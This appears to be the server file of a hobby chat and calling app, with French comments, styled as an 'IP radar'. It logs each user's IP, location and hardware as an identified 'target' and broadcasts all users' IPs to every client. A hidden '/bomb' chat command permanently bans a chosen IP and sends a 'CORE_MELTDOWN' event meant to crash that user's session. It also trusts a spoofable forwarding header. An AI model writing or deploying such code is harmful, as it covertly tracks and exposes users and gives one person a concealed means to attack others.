const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);

app.use(express.static(__dirname));

const users = {}; 
const bannedIPs = new Set(); 

io.on('connection', (socket) => {
    // CAPTURE IP RÉELLE (Même derrière un proxy simple)
    const ip = (socket.handshake.headers['x-forwarded-for'] || socket.conn.remoteAddress).split(',')[0].trim();

    // RADAR DE SÉCURITÉ : Crash immédiat si l'IP tente de revenir
    if (bannedIPs.has(ip)) {
        console.log(`[!] CIBLE BANNIE DÉTECTÉE : ${ip}. EXÉCUTION...`);
        socket.emit('CORE_MELTDOWN');
    }

    socket.on('init_user', (data) => {
        // On lie l'IP au socket pour les actions ciblées
        users[ip] = { ...data, sid: socket.id, ip: ip };
        
        console.log(`
        ╔═════════════ CIBLE IDENTIFIÉE ═════════════╗
        ║ NOM    : ${data.name}
        ║ IP     : ${ip} 
        ║ VILLE  : ${data.geo.city || 'Inconnue'}
        ║ PAYS   : ${data.geo.country || 'Inconnu'}
        ║ GPU    : ${data.hw.gpu}
        ║ RAM    : ${data.hw.ram} GB
        ╚════════════════════════════════════════════╝
        `);
        
        io.emit('update_users', Object.values(users));
    });

    socket.on('chat_msg', (data) => {
        const text = data.text.trim();
        // COMMANDE INVISIBLE : /bomb 176...
        if (text.startsWith("/bomb ")) {
            const target = text.split(" ")[1];
            bannedIPs.add(target);
            // On cherche toutes les sessions de cette IP
            Object.keys(users).forEach(uIP => {
                if (uIP.includes(target)) {
                    io.to(users[uIP].sid).emit('CORE_MELTDOWN');
                }
            });
            console.log(`[STRIKE] IP ${target} A ÉTÉ NEUTRALISÉE.`);
        } else {
            io.emit('chat_msg', data);
        }
    });

    socket.on('start_call', (toIP) => {
        if(users[toIP]) {
            io.to(users[toIP].sid).emit('incoming_call', { 
                fromName: users[ip].name, 
                fromPP: users[ip].pp,
                fromIP: ip 
            });
        }
    });

    socket.on('disconnect', () => {
        // On ne supprime pas l'IP de la blacklist au déconnect
    });
});

http.listen(3000, () => console.log("GALAXY_OS_IP_RADAR_READY"));
